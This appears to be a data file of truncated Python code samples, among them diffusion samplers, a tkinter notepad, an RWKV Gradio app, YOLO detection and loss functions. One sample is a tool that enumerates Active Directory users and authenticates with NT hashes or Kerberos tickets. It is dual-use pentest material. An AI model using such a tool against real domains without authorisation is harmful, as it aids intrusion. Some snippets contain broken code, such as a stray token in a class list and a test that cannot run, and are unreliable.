sigma, sigma_next: torch.randn_like(x)\r\n\r\n\r\nclass BatchedBrownianTree:\r\n    \"\"\"A wrapper around torchsde.BrownianTree that enables batches of entropy.\"\"\"\r\n\r\n    def __init__(self, x, t0, t1, seed=None, **kwargs):\r\n        t0, t1, self.sign = self.sort(t0, t1)\r\n        w0 = kwargs.get('w0', torch.zeros_like(x))\r\n        if seed is None:\r\n            seed = torch.randint(0, 2 ** 63 - 1, []).item()\r\n        self.batched = True\r\n        try:\r\n            assert len(seed) == x.shape[0]\r\n            w0 = w0[0]\r\n        except TypeError:\r\n            seed = [seed]\r\n            self.batched = False\r\n        self.trees = [torchsde.BrownianTree(t0, w0, t1, entropy=s, **kwargs) for s in seed]\r\n\r\n    @staticmethod\r\n    def sort(a, b):\r\n        return (a, b, 1) if a < b else (b, a, -1)\r\n\r\n    def __call__(self, t0, t1):\r\n        t0, t1, sign = self.sort(t0, t1)\r\n        w = torch.stack([tree(t0, t1) for tree in self.trees]) * (self.sign * sign)\r\n        return w if self.batched else w[0]\r\n\r\n\r\nclass BrownianTreeNoiseSampler:\r\n    \"\"\"A noise sampler backed by a torchsde.BrownianTree.\r\n\r\n    Args:\r\n        x (Tensor): The tensor whose shape, device and dtype to use to generate\r\n            random samples.\r\n        sigma_min (float): The low end of the valid interval.\r\n        sigma_max (float): The high end of the valid interval.\r\n        seed (int or List[int]): The random seed. If a list of seeds is\r\n            supplied instead of a single integer, then the noise sampler will\r\n            use one BrownianTree per batch item, each with its own seed.\r\n        transform (callable): A function that maps sigma to the sampler's\r\n            internal timestep.\r\n    \"\"\"\r\n\r\n    def __init__(self, x, sigma_min, sigma_max, seed=None, transform=lambda x: x):\r\n        self.transform = transform\r\n        t0, t1 = self.transform(torch.as_tensor(sigma_min)), self.transform(torch.as_tensor(sigma_max))\r\n        self.tree = BatchedBrownianTree(x, t0, t1, seed)\r\n\r\n    def __call__(self, sigma, sigma_next):\r\n        t0, t1 = self.transform(torch.as_tensor(sigma)), self.transform(torch.as_tensor(sigma_next))\r\n        return self.tree(t0, t1) / (t1 - t0).abs().sqrt()\r\n\r\n\r\n@torch.no_grad()\r\ndef sample_euler(model, x, sigmas, extra_args=None, callback=None, disable=None, s_churn=0., s_tmin=0., s_tmax=float('inf'), s_noise=1.):\r\n    \"\"\"Implements Algorithm 2 (Euler steps) from Karras et al. (2022).\"\"\"\r\n    extra_args = {} if extra_args is None else extra_args\r\n    # \u68c0\u67e5\u662f\u5426\u6709\u989d\u5916\u53c2\u6570\uff0c\u4e0d\u7528\u7ba1\u4e5f\u4e0d\u8981\u6539\r\n    s_in = x.new_ones([x.shape[0]])\r\n    # \u8d4b\u4e88\u8f93\u5165\u5411\u91cf\u7b49\u4e8e\u6c42\u89e3\u5411\u91cf\u7ef4\u5ea6\uff0c\u4e0d\u7528\u7ba1\u4e5f\u4e0d\u8981\u6539\r\n    for i in trange(len(sigmas) - 1, disable=disable):\r\n        # sigma\u7531\u6b65\u6570\u51b3\u5b9a,\u9ed8\u8ba420\u6b65\u4e0b\uff0clen(signas)-1\u4ee3\u8868\u5bf9\u4e8e0-19\u90fd\u89e3\u7b97\u4e00\u6b21\r\n        gamma = min(s_churn / (len(sigmas) - 1), 2 ** 0.5 - 1) if s_tmin <= sigmas[i] <= s_tmax else 0",
    "\r\nfrom tkinter import *\r\nfrom tkinter.messagebox import showinfo\r\nfrom tkinter.filedialog import askopenfilename, asksaveasfilename\r\nimport os\r\n\r\ndef newFile():\r\n    global file\r\n    root.title(\"Untitled - Notepad\")\r\n    file = None\r\n    TextArea.delete(1.0, END)\r\n\r\n\r\ndef openFile():\r\n    global file\r\n    file = askopenfilename(defaultextension=\".txt\",\r\n                           filetypes=[(\"All Files\", \"*.*\"),\r\n                                     (\"Text Documents\", \"*.txt\")])\r\n    if file == \"\":\r\n        file = None\r\n    else:\r\n        root.title(os.path.basename(file) + \" - Notepad\")\r\n        TextArea.delete(1.0, END)\r\n        f = open(file, \"r\")\r\n        TextArea.insert(1.0, f.read())\r\n        f.close()\r\n\r\n\r\ndef saveFile():\r\n    global file\r\n    if file == None:\r\n        file = asksaveasfilename(initialfile = 'Untitled.txt', defaultextension=\".txt\",\r\n                           filetypes=[(\"All Files\", \"*.*\"),\r\n                                     (\"Text Documents\", \"*.txt\")])\r\n        if file ==\"\":\r\n            file = None\r\n\r\n        else:\r\n            #Save as a new file\r\n            f = open(file, \"w\")\r\n            f.write(TextArea.get(1.0, END))\r\n            f.close()\r\n\r\n            root.title(os.path.basename(file) + \" - Notepad\")\r\n            print(\"File Saved\")\r\n    else:\r\n        # Save the file\r\n        f = open(file, \"w\")\r\n        f.write(TextArea.get(1.0, END))\r\n        f.close()\r\n\r\n\r\ndef quitApp():\r\n    root.destroy()\r\n\r\ndef cut():\r\n    TextArea.event_generate((\"<<Cut>>\"))\r\n\r\ndef copy():\r\n    TextArea.event_generate((\"<<Copy>>\"))\r\n\r\ndef paste():\r\n    TextArea.event_generate((\"<<Paste>>\"))\r\n\r\ndef about():\r\n    showinfo(\"Notepad\", \"Notepad by Muhammad Hasnat Rasool\")\r\n\r\nif __name__ == '__main__':\r\n    #Basic tkinter setup\r\n    root = Tk()\r\n    root.title(\"Untitled - Notepad\")\r\n    root.wm_iconbitmap(\"favicon.ico\")\r\n    root.geometry(\"800x650\")\r\n\r\n    #Add TextArea\r\n    TextArea = Text(root, font=\"lucida 13\")\r\n    file = None\r\n    TextArea.pack(expand=True, fill=BOTH)\r\n\r\n    # Lets create a menubar\r\n    MenuBar = Menu(root)\r\n\r\n    #File Menu Starts\r\n    FileMenu = Menu(MenuBar, tearoff=0)\r\n    # To open new file\r\n    FileMenu.add_command(label=\"New\", command=newFile)\r\n\r\n    #To Open already existing file\r\n    FileMenu.add_command(label=\"Open\", command = openFile)\r\n\r\n    # To save the current file\r\n\r\n    FileMenu.add_command(label = \"Save\", command = saveFile)\r\n    FileMenu.add_separator()\r\n    FileMenu.add_command(label = \"Exit\", command = quitApp)\r\n    MenuBar.add_cascade(label = \"File\", menu=FileMenu)\r\n    # File Menu ends\r\n\r\n    # Edit Menu Starts\r\n    EditMenu = Menu(MenuBar, tearoff=0)\r\n    #To give a feature of cut, copy and paste\r\n    EditMenu.add_command(label = \"Cut\", command=cut)\r\n    EditMenu.add_command(label = \"Copy\", command=copy)\r\n    EditMenu.add_command(label = \"Paste\", command=paste)\r\n\r\n    MenuBar.add_cascade(label=\"Edit\", menu = EditMenu)\r\n\r\n    # Edit Menu Ends\r\n\r\n  \r\n    HelpMenu = Menu(MenuBar, tearoff=0)\r\n    HelpMenu.add_command(label = \"About Notepad\", command=about)\r\n    MenuBar.add_cascade(label=\"Help\", menu=HelpMenu)\r\n\r\n    \r\n\r\n    root.config(menu=MenuBar)\r\n\r\n    \r\n    Scroll = Scrollbar(TextArea)\r\n    Scroll.pack(side=RIGHT,  fill=Y)\r\n    Scroll.config(command=TextArea.yview)\r\n    TextArea.config(yscrollcommand=Scroll.set)\r\n\r\n    root.mainloop()\r\n",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# File name          : UsersWithPwdLastSetOlderThan.py\n# Author             : Podalirius (@podalirius_)\n# Date created       : 19 May 2022\n\nimport datetime\nimport xlsxwriter\nfrom impacket.examples import logger, utils\nfrom impacket import version\nfrom impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError\nfrom impacket.spnego import SPNEGO_NegTokenInit, TypesMech\nimport argparse\nimport binascii\nimport ldap3\nimport logging\nimport os\nimport ssl\nimport sys\n\n\ndef get_domain_users(ldap_server, ldap_session, attrs=[\"*\"]):\n    ts_never_low  = datetime.datetime(1601,  1,  1,  0,  0, tzinfo=datetime.timezone.utc)\n    ts_never_high = datetime.datetime(9999, 12, 31, 23, 59, 59, 999999, tzinfo=datetime.timezone.utc)\n    results = {}\n    target_dn = ldap_server.info.other[\"defaultNamingContext\"]\n    ldap_session.search(target_dn, \"(&(objectCategory=person)(pwdLastSet=*))\", attributes=attrs)\n    for entry in ldap_session.response:\n        if entry['type'] != 'searchResEntry':\n            continue\n        results[entry['dn']] = {}\n        for attrname in attrs:\n            if attrname in ['name', 'sAMAccountName', 'distinguishedName']:\n                results[entry['dn']][attrname] = entry[\"attributes\"][attrname]\n\n            elif attrname in ['memberOf', 'description']:\n                results[entry['dn']][attrname] = '\\n'.join(entry[\"attributes\"][attrname])\n\n            elif attrname in ['adminCount', 'logonCount']:\n                results[entry['dn']][attrname] = entry[\"attributes\"][attrname]\n                if (type(entry[\"attributes\"][attrname]) == list):\n                    if (len(entry[\"attributes\"][attrname]) == 0):\n                        results[entry['dn']][attrname] = 0\n\n            elif attrname in ['whenCreated', 'pwdLastSet', 'lastLogon', 'lastLogoff', 'lastLogonTimestamp', 'accountExpires']:\n                if (type(entry[\"attributes\"][attrname]) == list):\n                    if (len(entry[\"attributes\"][attrname]) == 0):\n                        results[entry['dn']][attrname] = \"Never\"\n                elif (entry[\"attributes\"][attrname] == ts_never_low) or (entry[\"attributes\"][attrname] ==  ts_never_high):\n                    results[entry['dn']][attrname] = \"Never\"\n                else:\n                    results[entry['dn']][attrname] = entry[\"attributes\"][attrname].strftime(\"%m/%d/%Y, %H:%M:%S\")\n\n    return results\n\n\ndef parseArgs():\n    print(\"UsersWithPwdLastSetOlderThan v1.2 - by @podalirius_\\n\")\n\n    parser = argparse.ArgumentParser(add_help=True, description=\"Extract all users from an Active Directory domain to an Excel worksheet.\")\n    \n    parser.add_argument(\"--use-ldaps\", action=\"store_true\", help=\"Use LDAPS instead of LDAP\")\n    parser.add_argument(\"-q\", \"--quiet\", dest=\"quiet\", action=\"store_true\", default=False, help=\"Show no information at all.\")\n    parser.add_argument(\"-debug\", dest=\"debug\", action=\"store_true\", default=False, help=\"Debug mode.\")\n    parser.add_argument(\"-no-colors\", dest=\"colors\", action=\"store_false\", default=True, help=\"Disables colored output mode\")\n    parser.add_argument(\"-o\", \"--output-file\", dest=\"output_file\", type=str, default=None, required=False, help=\"Output file to store the results in. (default: accounts.xlsx)\")\n\n    parser.add_argument(\"-D\", \"--days\", default=365, type=int, help=\"Number of days since last password change.\")\n\n    authconn = parser.add_argument_group(\"authentication & connection\")\n    authconn.add_argument(\"--dc-ip\", required=True, action=\"store\", metavar=\"ip address\", help=\"IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter\")\n    authconn.add_argument(\"-d\", \"--domain\", dest=\"auth_domain\", metavar=\"DOMAIN\", action=\"store\", help=\"(FQDN) domain to authenticate to\")\n    authconn.add_argument(\"-u\", \"--user\", dest=\"auth_username\", metavar=\"USER\", action=\"store\", help=\"user to authenticate with\")\n\n    secret = parser.add_argument_group()\n    cred = secret.add_mutually_exclusive_group()\n    cred.add_argument(\"--no-pass\", action=\"store_true\", help=\"Don't ask for password (useful for -k)\")\n    cred.add_argument(\"-p\", \"--password\", dest=\"auth_password\", metavar=\"PASSWORD\", action=\"store\", help=\"Password to authenticate with\")\n    cred.add_argument(\"-H\", \"--hashes\", dest=\"auth_hashes\", action=\"store\", metavar=\"[LMHASH:]NTHASH\", help=\"NT/LM hashes, format is LMhash:NThash\")\n    cred.add_argument(\"--aes-key\", dest=\"auth_key\", action=\"store\", metavar=\"hex key\", help=\"AES key to use for Kerberos Authentication (128 or 256 bits)\")\n    secret.add_argument(\"-k\", \"--kerberos\", dest=\"use_kerberos\", action=\"store_true\", help=\"Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line\")\n\n    if len(sys.argv) == 1:\n      ",
    "import torch\nimport torch.nn as nn\n\n\nclass VAENet(nn.Module):\n\n    class Sampler(nn.Module):\n\n        def forward(self, m, gamma):\n            return torch.randn_like(m) * torch.exp(gamma / 2) + m        \n    \n    def __init__(self, latent_dim : int = 10) -> None:\n        super().__init__()\n\n        self.act = nn.ReLU()\n\n        self.input_layer = nn.Linear(784, 256)\n        self.encoder_hidden = nn.Linear(256, 100)\n        self.mean_layer = nn.Linear(100, latent_dim)\n        self.gamma_layer = nn.Linear(100, latent_dim)\n\n        self.sampler = VAENet.Sampler()\n\n        self.initial_decoder = nn.Linear(latent_dim, 100)\n        self.hidden_decoder = nn.Linear(100, 256)\n        self.final_decoder = nn.Linear(256, 784)\n\n        \n    \n    def forward(self, x):\n        x = self.act(self.input_layer(x))\n        x = self.act(self.encoder_hidden(x))\n        \n        m = self.mean_layer(x)\n        gamma = self.gamma_layer(x)\n\n        x = self.sampler(m, gamma)\n\n        x = self.act(self.initial_decoder(x))\n        x = self.act(self.hidden_decoder(x))\n        x = self.final_decoder(x)\n        \n        return x, m, gamma\n    \n\n    def decode(self, x):\n\n        x = self.act(self.initial_decoder(x))\n        x = self.act(self.hidden_decoder(x))\n        x = self.final_decoder(x)\n        \n        return x",
    "import argparse\nimport time\nimport sampling\nfrom rwkv_cpp import rwkv_cpp_shared_library, rwkv_cpp_model\nfrom tokenizer_util import add_tokenizer_argument, get_tokenizer\nfrom rwkv_cpp import rwkv_world_tokenizer\nfrom typing import List\nimport gradio as gr\nimport time\nimport sampling\n\nimport requests\nimport json\n\nfrom pydub import AudioSegment\nfrom pydub.playback import play\n\n\ntitle = \"RWKV-5-H-World\"\n\nmodel = None\n\ntokenizer_decode = None\n\ntokenizer_encode = None\n\n\ndef read_now(text,api_url):\n\n    if text == \"\":\n        return \"\u8bf7\u8f93\u5165\u8981\u64ad\u653e\u7684\u6587\u672c\"\n\n    data = json.dumps({\"text\":text})#\u8f6c\u6362\u4e3ajson\u5b57\u7b26\u4e32\n    headers = {\"Content-Type\":\"application/json\"}#\u6307\u5b9a\u63d0\u4ea4\u7684\u662fjson\n    r = requests.post(f\"{api_url}\",data=data,headers=headers)\n\n    with open('./output_audio.wav', 'wb') as audio_file:\n        audio_file.write(r.content)\n    sound = AudioSegment.from_file(\"./output_audio.wav\", format=\"wav\")\n    play(sound)\n\n\ndef load_model(model_name):\n\n    # Load the model accordingly\n\n    global model,tokenizer_decode,tokenizer_encode\n    \n    library = rwkv_cpp_shared_library.load_rwkv_shared_library()\n    print(f'System info: {library.rwkv_get_system_info_string()}')\n\n    print('Loading RWKV model')\n    model = rwkv_cpp_model.RWKVModel(library,model_name)\n\n    tokenizer_decode, tokenizer_encode = get_tokenizer('auto', model.n_vocab)\n\n    return \"\u52a0\u8f7d\u6210\u529f\"\n\n\n\n\ndef evaluate(\n    ctx,\n    token_count=200,\n    temperature=1.0,\n    top_p=0.7,\n    presencePenalty = 0.1,\n    countPenalty = 0.1,\n):\n  prompt_tokens = tokenizer_encode(ctx)\n\n  prompt_token_count = len(prompt_tokens)\n\n  init_logits, init_state = model.eval_sequence_in_chunks(prompt_tokens, None, None, None, use_numpy=True)\n\n  logits, state = init_logits.copy(), init_state.copy()\n\n  out_str = ''\n\n  occurrence = {}\n\n  for i in range(token_count):\n    for n in occurrence:\n      logits[n] -= (presencePenalty + occurrence[n] * countPenalty)\n\n    token: int = sampling.sample_logits(logits, temperature, top_p)\n\n    tk = tokenizer_decode([token])\n    #print(tokenizer_decode([token]), end='', flush=True)\n    out_str+=tk\n    yield out_str\n\n    for xxx in occurrence:\n      occurrence[xxx] *= 0.996\n\n    if token not in occurrence:\n      occurrence[token] = 1\n    else:\n      occurrence[token] += 1\n\n    logits, state = model.eval(token, state, state, logits, use_numpy=True)\n\ndef main():\n\n    # Gradio blocks\n    with gr.Blocks(title=title) as demo:\n        gr.HTML(f\"<div style=\\\"text-align: center;\\\">\\n<h1>RWKV-5 World v2 - {title}</h1>\\n</div>\")\n\n        gr.HTML(f\"<div style=\\\"text-align: center;\\\">\\n<h1>\u6a21\u578b\u91cf\u5316\u8bf4\u660e</h1>\\n\u6a21\u578b\u91cf\u5316\u7cbe\u5ea6\u4ece\u9ad8\u5230\u4f4e\u6392\u5217\u987a\u5e8f\u662f\uff1afp16>int8>int4\uff0c\u91cf\u5316\u7684\u7cbe\u5ea6\u8d8a\u4f4e\uff0c\u6a21\u578b\u7684\u5927\u5c0f\u548c\u63a8\u7406\u6240\u9700\u7684\u663e\u5b58\u5c31\u8d8a\u5c0f\uff0c\u4f46\u6a21\u578b\u7684\u6027\u80fd\u4e5f\u4f1a\u8d8a\u5dee\u3002\\n\u8fd9\u91cc\u91cf\u5316\u540e\u7684\u6a21\u578b\u90fd\u662fggml\u683c\u5f0f\uff0c\u9ed8\u8ba4\u4f7f\u7528Q5_1\u7684\u91cf\u5316\u7248\u672c\uff0c\u5b83\u7684\u4f53\u79ef\u53ea\u6709\u5168\u7cbe\u5ea6\u7684\u4e00\u534a\uff0c\u4f46\u662f\u6027\u80fd\u4f1a\u4e0b\u964d\u3002\u53e6\u5916\u63d0\u4f9bfp16\u7684\u91cf\u5316\u7248\u672c\uff0c\u7cbe\u5ea6\u635f\u5931\u6700\u5c0f\uff0c\u6027\u80fd\u63a5\u8fd1\u539f\u7248\uff0c\u4f46\u662f\u901f\u5ea6\u8981\u6bd4Q5_1\u7684\u91cf\u5316\u7248\u672c\u8981\u6162\u3002</div>\")\n\n            \n        with gr.Tab(\"RWKV-5-h\"):\n            gr.Markdown(f\"This is RWKV-5-h \")\n\n            with gr.Row():\n                with gr.Column():\n                    model_dropdown = gr.Dropdown(label=\"\u6a21\u578b\u5217\u8868\", choices=[\"./rwkv-5-h-world-7B-Q5_1.bin\", \"./rwkv-5-h-world-7B-fp16.bin\"], value=\"./rwkv-5-h-world-7B-Q5_1.bin\", interactive=True)\n          \n\n                    b_load = gr.Button(\"\u52a0\u8f7d\u6a21\u578b\", variant=\"primary\")\n                    b_output = gr.Textbox(label=\"\u52a0\u8f7d\u7ed3\u679c\")\n\n            b_load.click(load_model, [model_dropdown], [b_output])\n\n\n            with gr.Row():\n                with gr.Column():\n                    prompt = gr.Textbox(lines=2, label=\"Prompt\", value=\"\"\"\u8fb9\u513f\u4e0a\u8fd8\u6709\u4e24\u6761\u817f\uff0c\u4fee\u957f\u3001\u7ed3\u5b9e\uff0c\u5149\u6ed1\u5f97\u51fa\u5947\uff0c\u6f5c\u4f0f\u7740\n    \u5a9a\u4eba\u7684\u6d3b\u529b\u3002\u4ed6\u7d27\u5f20\u5f97\u810a\u6881\u90fd\u76b1\u4e86\u8d77\u6765\u3002\u4f46\u4ed6\u4e0d\u52a8\u58f0\u8272\u3002\"\"\")\n                    token_count = gr.Slider(10, 500, label=\"Max Tokens\", step=10, value=200)\n                    temperature = gr.Slider(0.2, 2.0, label=\"Temperature\", step=0.1, value=1.0)\n                    top_p = gr.Slider(0.0, 1.0, label=\"Top P\", step=0.05, value=0.3)\n                    presence_penalty = gr.Slider(0.0, 1.0, label=\"Presence Penalty\", step=0.1, value=1)\n                    count_penalty = gr.Slider(0.0, 1.0, label=\"Count Penalty\", step=0.1, value=1)\n                with gr.Column():\n                    with gr.Row():\n                        submit = gr.Button(\"\u5f00\u59cb\u63a8\u7406\", variant=\"primary\")\n                        clear = gr.Button(\"Clear\", variant=\"secondary\")\n                    output = gr.Textbox(label=\"Output\", lines=5)\n                    api_url = gr.Textbox(label=\"GPT-SoVITS\u63a5\u53e3\u5730\u5740\", value=\"http://localhost:9880/tts_to_audio/\")\n                    read_b = gr.Button(\"\u5f00\u59cb\u6717\u8bfb\", variant=\"primary\")\n            data = gr.Dataset(components=[prompt, token_count, temperature, top_p, presence_penalty, count_penalty], label=\"Example Instructions\", headers=[\"Prompt\", \"Max Tokens\", \"Temperature\", \"Top P\", \"Presence Penalty\", \"Count Penalty\"])\n            submit.click(evaluate, [prompt, token_count, temperature, top_p, presence_penalty, count_penalty], [output])\n            clear.click(lambda: None, [], [output])\n            data.click(lambda x: x, [data], [prompt, token_count, temperature, top_p, presence_penalty, count_penalty])\n\n            read_b.click(read_now,[output,api_ur",
    "import io\nimport cv2\nimport cvzone\nimport math\nimport streamlit as st\nfrom collections import Counter\nimport pyttsx3\nfrom ultralytics import YOLO\n\n# Load COCO class names\ncoco_classes = [\n    'person', 'bicycle', 'car', 'motorbike', 'aeroplane', 'bus', 'train', 'truck', 'boat', 'traffic light',\n    'fire hydrant', 'stop sign', 'parking meter', 'bench', 'bird', 'cat', 'dog', 'horse', 'sheep', 'cow',\n    'elephant', 'bear', 'zebra', 'giraffe', 'backpack', 'umbrella', 'handbag', 'tie', 'suitcase', 'frisbee',\n    'skis', 'snowboard', 'sports ball', 'kite', 'baseball bat', 'baseball glove', 'skateboard', 'surfboard',tre\n    'tennis racket', 'bottle', 'wine glass', 'cup', 'fork', 'knife', 'spoon', 'bowl', 'banana', 'apple',\n    'sandwich', 'orange', 'broccoli', 'carrot', 'hot dog', 'pizza', 'donut', 'cake', 'chair', 'sofa', 'pottedplant',\n    'bed', 'diningtable', 'toilet', 'tvmonitor', 'laptop', 'mouse', 'remote', 'keyboard', 'cell phone', 'microwave',\n    'oven', 'toaster', 'sink', 'refrigerator', 'book', 'clock', 'vase', 'scissors', 'teddy bear', 'hair drier',\n    'toothbrush'\n]\n\ndef detect_objects(image_path):\n    detected_classes = set()\n    model=YOLO('../Running Yolo/yolov8l.pt')\n    input_image = cv2.imread(image_path)\n    results = model(input_image)\n\n    for r in results:\n        boxes = r.boxes\n        for box in boxes:\n            x1, y1, x2, y2 = box.xyxy[0].tolist()\n            x1, y1, x2, y2 = int(x1), int(y1), int(x2), int(y2)\n            w, h = x2 - x1, y2 - y1\n            cls = int(box.cls[0])\n            cvzone.cornerRect(input_image, (x1, y1, w, h), colorR=(255, 0, 255), colorC=(0, 255, 0))\n            cvzone.putTextRect(input_image, f'{coco_classes[cls]} ', (max(0, x1), max(35, y1)),\n                               scale=0.6, thickness=1, offset=3)\n            conf = math.ceil((box.conf[0] * 100)) / 100\n            class_name = coco_classes[cls]\n            detected_classes.add(class_name)\n\n    total_objects = len(detected_classes)\n    class_counts = Counter(detected_classes)\n    class_info = \"\\n\".join([f\"{class_name} has occurred {count} times\" for class_name, count in class_counts.items()])\n    return input_image, total_objects, class_info\n\nst.title('Object Detection with YOLOv8')\n\nuploaded_file = st.file_uploader(\"Choose an image...\", type=[\"jpg\", \"png\", \"jpeg\"])\n\nif uploaded_file is not None:\n    image_path = \"temp_image.jpg\"\n    with open(image_path, \"wb\") as f:\n        f.write(uploaded_file.getvalue())\n    \n    image, total_objects, class_info = detect_objects(image_path)\n    st.image(image, caption='Object Detection Result', use_column_width=True)\n    \n    st.write(f\"Total types of objects detected: {total_objects}\")\n    st.write(\"Classes and their counts:\")\n    st.write(class_info)\n\n    # For downloading image\n    # with open(\"temp_image.jpg\", \"rb\") as file:\n    #     btn = st.download_button(\n    #         label=\"Download image\",\n    #         data=file,\n    #         file_name=\"object_detection_result.jpg\",\n    #         mime=\"image/jpeg\"\n    #     )\n\n    engine = pyttsx3.init()\n    engine.say(\"In the image, the following objects were detected:\")\n    engine.say(class_info)\n    engine.runAndWait()\n    \n    img_bytes = cv2.imencode(\".jpg\", image)[1].tobytes()\n    btn = st.download_button(\n        label=\"Download image\",\n        data=io.BytesIO(img_bytes),\n        file_name=\"object_detection_result.jpg\",\n        mime=\"image/jpeg\"\n    )\n\n",
    "import math\nimport numpy as np\n\nfrom typing import Optional\n\nimport torch\nimport torch.nn.functional as F\n\n__all__ = [\n    \"focal_loss_with_logits\",\n    \"softmax_focal_loss_with_logits\",\n    \"soft_jaccard_score\",\n    \"soft_dice_score\",\n    \"wing_loss\",\n]\n\n\ndef to_tensor(x, dtype=None) -> torch.Tensor:\n    if isinstance(x, torch.Tensor):\n        if dtype is not None:\n            x = x.type(dtype)\n        return x\n    if isinstance(x, np.ndarray):\n        x = torch.from_numpy(x)\n        if dtype is not None:\n            x = x.type(dtype)\n        return x\n    if isinstance(x, (list, tuple)):\n        x = np.array(x)\n        x = torch.from_numpy(x)\n        if dtype is not None:\n            x = x.type(dtype)\n        return x\n\n\ndef focal_loss_with_logits(\n    output: torch.Tensor,\n    target: torch.Tensor,\n    gamma: float = 2.0,\n    alpha: Optional[float] = 0.25,\n    reduction: str = \"mean\",\n    normalized: bool = False,\n    reduced_threshold: Optional[float] = None,\n    eps: float = 1e-6,\n) -> torch.Tensor:\n    \"\"\"Compute binary focal loss between target and output logits.\n    See :class:`~pytorch_toolbelt.losses.FocalLoss` for details.\n\n    Args:\n        output: Tensor of arbitrary shape (predictions of the model)\n        target: Tensor of the same shape as input\n        gamma: Focal loss power factor\n        alpha: Weight factor to balance positive and negative samples. Alpha must be in [0...1] range,\n            high values will give more weight to positive class.\n        reduction (string, optional): Specifies the reduction to apply to the output:\n            'none' | 'mean' | 'sum' | 'batchwise_mean'. 'none': no reduction will be applied,\n            'mean': the sum of the output will be divided by the number of\n            elements in the output, 'sum': the output will be summed. Note: :attr:`size_average`\n            and :attr:`reduce` are in the process of being deprecated, and in the meantime,\n            specifying either of those two args will override :attr:`reduction`.\n            'batchwise_mean' computes mean loss per sample in batch. Default: 'mean'\n        normalized (bool): Compute normalized focal loss (https://arxiv.org/pdf/1909.07829.pdf).\n        reduced_threshold (float, optional): Compute reduced focal loss (https://arxiv.org/abs/1903.01347).\n\n    References:\n        https://github.com/open-mmlab/mmdetection/blob/master/mmdet/core/loss/losses.py\n    \"\"\"\n    target = target.type(output.type())\n\n    logpt = F.binary_cross_entropy_with_logits(output, target, reduction=\"none\")\n    pt = torch.exp(-logpt)\n\n    # compute the loss\n    if reduced_threshold is None:\n        focal_term = (1.0 - pt).pow(gamma)\n    else:\n        focal_term = ((1.0 - pt) / reduced_threshold).pow(gamma)\n        focal_term[pt < reduced_threshold] = 1\n\n    loss = focal_term * logpt\n\n    if alpha is not None:\n        loss *= alpha * target + (1 - alpha) * (1 - target)\n\n    if normalized:\n        norm_factor = focal_term.sum().clamp_min(eps)\n        loss /= norm_factor\n\n    if reduction == \"mean\":\n        loss = loss.mean()\n    if reduction == \"sum\":\n        loss = loss.sum()\n    if reduction == \"batchwise_mean\":\n        loss = loss.sum(0)\n\n    return loss\n\n\ndef softmax_focal_loss_with_logits(\n    output: torch.Tensor,\n    target: torch.Tensor,\n    gamma: float = 2.0,\n    reduction=\"mean\",\n    normalized=False,\n    reduced_threshold: Optional[float] = None,\n    eps: float = 1e-6,\n) -> torch.Tensor:\n    \"\"\"Softmax version of focal loss between target and output logits.\n    See :class:`~pytorch_toolbelt.losses.FocalLoss` for details.\n\n    Args:\n        output: Tensor of shape [B, C, *] (Similar to nn.CrossEntropyLoss)\n        target: Tensor of shape [B, *] (Similar to nn.CrossEntropyLoss)\n        reduction (string, optional): Specifies the reduction to apply to the output:\n            'none' | 'mean' | 'sum' | 'batchwise_mean'. 'none': no reduction will be applied,\n            'mean': the sum of the output will be divided by the number of\n            elements in the output, 'sum': the output will be summed. Note: :attr:`size_average`\n            and :attr:`reduce` are in the process of being deprecated, and in the meantime,\n            specifying either of those two args will override :attr:`reduction`.\n            'batchwise_mean' computes mean loss per sample in batch. Default: 'mean'\n        normalized (bool): Compute normalized focal loss (https://arxiv.org/pdf/1909.07829.pdf).\n        reduced_threshold (float, optional): Compute reduced focal loss (https://arxiv.org/abs/1903.01347).\n    \"\"\"\n    log_softmax = F.log_softmax(output, dim=1)\n\n    loss = F.nll_loss(log_softmax, target, reduction=\"none\")\n    pt = torch.exp(-loss)\n\n    # compute the loss\n    if reduced_threshold is None:\n        focal_term = (1.0 - pt).pow(gamma)\n    else:\n        focal_term = ((1.0 - pt) / reduced_threshold).pow(gamma)\n        focal_term[pt < reduced_threshold] = 1\n\n    loss = focal_term * loss\n\n    if normalized:\n        norm_factor = focal_te",
    "#placeholder\nimport datetime\nimport unittest\nfrom unittest.mock import Mock, patch\n\ndef example_function():\n    # Add your function implementation here\n    pass\n\nclass AppError(Exception):\n    def __init__(self, message, *, user_id=None, request_details=None):\n        super().__init__(message)\n        self.name = self.__class__.__name__\n        self.user_id = user_id\n        self.request_details = request_details\n        self.timestamp = datetime.datetime.now()\n\ndef run_tests():\n    suite = unittest.TestLoader().loadTestsFromModule(unittest.find(__name__))\n    unittest.TextTestRunner(verbosity=2).run(suite)\n\n@patch('module_name.example_function')\nclass TestExampleFunction(unittest.TestCase):\n    def test_example_function(self, mock_example_function):\n        mock_example_function.side_effect = ZeroDivisionError('division by zero')\n\n        with self.assertRaises(AppError) as context:\n            example_function()\n\n        app_error = context.exception\n        self.assertEqual(app_error.user_id, 123)\n        self.assertEqual(app_error.request_details, {'url': 'example.com', 'method': 'GET'})\n\nif __name__ == '__main__':\n    run_tests()\n",
    "import csv\nimport datetime\nimport json\nimport numpy as np\nimport os\nfrom keras.layers import Embedding,Dense, Activation,TimeDistributed, GRU, Dropout, Input\nfrom keras.optimizers import Adam\nfrom keras.utils.np_utils import to_categorical\nfrom keras.models import Model\nfrom keras.callbacks import TensorBoard, Callback, EarlyStopping\nfrom make_smile import zinc_data_with_bracket_original,zinc_processed_with_bracket\n\nfrom keras.utils import pad_sequences\n\nfrom tensorflow import distribute, data\nimport tensorflow as tf\n\n\ndef load_data():\n\n    sen_space=[]\n    f = open(os.path.dirname(__file__)+'/../data/smile_trainning.csv', 'rb')\n    reader = csv.reader(f)\n    for row in reader:\n        sen_space.append(row)\n    f.close()\n\n    element_table=[\"Cu\",\"Ti\",\"Zr\",\"Ga\",\"Ge\",\"As\",\"Se\",\"Br\",\"Si\",\"Zn\",\"Cl\",\"Be\",\"Ca\",\"Na\",\"Sr\",\"Ir\",\"Li\",\"Rb\",\"Cs\",\"Fr\",\"Be\",\"Mg\",\n            